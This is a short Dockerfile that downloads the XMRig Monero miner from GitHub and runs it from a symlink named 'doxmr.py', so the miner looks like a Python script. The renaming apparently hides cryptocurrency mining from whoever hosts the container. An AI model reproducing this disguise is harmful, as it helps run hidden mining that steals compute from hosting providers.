FROM alpine:latest

ENV version=6.3.5
RUN apk add --no-cache wget

WORKDIR /app
ADD doxmr.json ./
RUN wget -O doxmr.tar.gz https://github.com/xmrig/xmrig/releases/download/v$version/xmrig-$version-linux-static-x64.tar.gz && \
    tar xzvf doxmr.tar.gz -C /app

RUN ln -s ./xmrig-$version/xmrig ./doxmr.py
ENTRYPOINT ./doxmr.py -c ./doxmr.json
